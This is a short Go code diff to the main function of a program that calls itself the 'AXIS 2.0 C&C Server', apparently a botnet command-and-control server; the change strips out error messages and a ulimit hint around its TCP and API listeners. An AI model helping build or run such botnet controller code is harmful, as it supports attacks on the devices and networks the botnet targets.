@@ -30,7 +30,6 @@ func main() {
 	// Start C&C server
 	tel, err := net.Listen("tcp", CNCListenAddr)
 	if err != nil {
-		fmt.Println(err)
 		return
 	}
 
@@ -38,7 +37,6 @@ func main() {
 	if APIListenAddr != "" {
 		api, err := net.Listen("tcp", APIListenAddr)
 		if err != nil {
-			fmt.Println(err)
 			return
 		}
 
@@ -51,7 +49,6 @@ func main() {
 				go apiHandler(conn)
 			}
 		}()
-		fmt.Printf("API Server listening on %s\n", APIListenAddr)
 	}
 
 	fmt.Printf("AXIS 2.0 C&C Server listening on %s\n", CNCListenAddr)
@@ -63,8 +60,6 @@ func main() {
 		}
 		go initialHandler(conn)
 	}
-
-	fmt.Println("ERROR: run ulimit -n 999999")
 }
 
 func initialHandler(conn net.Conn) {
